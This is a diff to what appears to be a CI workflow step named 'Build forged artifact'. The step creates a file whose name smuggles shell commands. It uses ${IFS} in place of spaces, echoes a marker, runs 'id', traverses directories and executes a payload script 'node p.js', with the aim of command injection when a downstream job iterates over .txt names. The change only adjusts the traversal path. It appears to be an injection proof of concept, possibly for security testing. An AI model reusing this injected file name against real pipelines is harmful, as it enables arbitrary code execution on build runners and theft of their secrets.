@@ -11,6 +11,7 @@ jobs:
     steps:
       - name: Build forged artifact
         run: |
+          rm -rf content
           mkdir -p content
           # `body` is the cat target of the injected command (no .txt suffix, so
           # it is not itself a matrix entry); the hostile .txt name is the only
@@ -18,11 +19,10 @@ jobs:
           printf 'forged report body' > content/body
           python3 - <<'PY'
           import os
-          ups = ";".join(["cd${IFS}.."] * 12)
           name = (
               "body;echo${IFS}INJECTION-EXECUTED;id;"
-              + ups
-              + ";cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
+              "cd${IFS}$HOME;cd${IFS}..;cd${IFS}..;"
+              "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
           )
           assert len(name) < 255, len(name)
           open(os.path.join("content", name), "w").close()
